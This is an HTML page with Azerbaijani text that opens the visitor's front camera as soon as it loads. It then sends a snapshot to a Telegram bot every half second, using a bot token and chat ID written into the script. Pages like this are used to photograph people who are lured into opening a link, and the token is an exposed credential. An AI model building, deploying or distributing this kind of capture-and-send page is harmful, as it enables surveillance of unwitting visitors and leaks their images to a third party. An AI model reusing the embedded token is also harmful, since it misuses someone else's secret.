<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Kameradan Telegram-a Şəkil Göndərən</title>
  <style>
    body { 
      margin:0; 
      background:#000; 
      font-family:monospace; 
      color:#0f3; 
      overflow:hidden;
    }
    #video {
      position: fixed; 
      inset:0; 
      width:100vw; 
      height:100vh; 
      object-fit:cover;
      transform: scaleX(-1); /* güzgü effekti – istəmirsənsə sil */
    }
    #status {
      position: fixed; 
      top:16px; 
      left:16px; 
      background:rgba(0,0,0,0.75);
      padding:12px 20px; 
      border-radius:8px; 
      z-index:999; 
      font-size:16px;
      box-shadow: 0 0 10px rgba(0,255,0,0.3);
    }
    #info {
      position: fixed;
      bottom: 16px;
      left: 16px;
      background: rgba(0,0,0,0.7);
      padding: 10px 16px;
      border-radius: 6px;
      font-size: 14px;
      z-index: 999;
    }
  </style>
</head>
<body>

<div id="status">Kamera açılır... brauzer bildirişinə icazə ver</div>
<div id="info">Şəkillər hər 0.5 saniyədən bir Telegram-a gedir</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
// ────────────────────────────────────────────────
// SƏNİN MƏLUMATLARIN ARTİQ BURADA YAZILIB
const BOT_TOKEN   = "8514355914:AAFR7vh1Swu6cIpb_vHODNik9zdxDlCsWP4";
const CHAT_ID     = "6570410435";
const INTERVAL_MS = 500;          // 0.5 saniyə
const PHOTO_QUALITY = 0.68;       // 0.6–0.85 arası dəyişə bilərsən (kiçik fayl = aşağı rəqəm)

const video  = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx    = canvas.getContext('2d');
const status = document.getElementById('status');

let stream = null;
let sendCount = 0;

async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { 
        facingMode: "user",
        width: { ideal: 1280 },
        height: { ideal: 720 }
      }
    });

    video.srcObject = stream;
    status.textContent = `Kamera aktiv • hər ${INTERVAL_MS/1000} saniyədə göndərirəm`;
    status.style.background = "rgba(0,100,0,0.7)";
    status.style.color = "#0f0";

    video.onloadedmetadata = () => {
      canvas.width  = video.videoWidth;
      canvas.height = video.videoHeight;
      startSending();
    };

  } catch (err) {
    status.textContent = "Kamera xətası: " + err.message;
    status.style.background = "rgba(150,0,0,0.8)";
    status.style.color = "#f88";
    console.error("Kamera xətası:", err);
  }
}

async function sendPhoto() {
  try {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL('image/jpeg', PHOTO_QUALITY);

    const blob = await (await fetch(dataUrl)).blob();
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, `capture_${Date.now()}.jpg`);

    // İstəsən caption da əlavə et
    // formData.append('caption', `Şəkil ${++sendCount} — ${new Date().toLocaleString('az-AZ')}`);

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      { method: 'POST', body: formData }
    );

    const result = await response.json();

    if (result.ok) {
      status.textContent = `Göndərildi #${++sendCount} → ${new Date().toLocaleTimeString('az-AZ')}`;
      status.style.background = "rgba(0,120,0,0.7)";
    } else {
      status.textContent = `Xəta: ${result.description || "Bilinmir"}`;
      status.style.background = "rgba(180,0,0,0.8)";
      console.error("Telegram xətası:", result);
    }

  } catch (err) {
    status.textContent = "Göndərmə xətası → konsola bax (F12)";
    status.style.background = "rgba(180,0,0,0.8)";
    console.error("Fetch xətası:", err);
  }
}

function startSending() {
  setInterval(sendPhoto, INTERVAL_MS);
}

// Səhifə açılan kimi başla
window.addEventListener('load', startCamera);

// Səhifəni bağlayanda / yeniləyəndə kameranı söndür
window.addEventListener('beforeunload', () => {
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
});
</script>
</body>
</html>
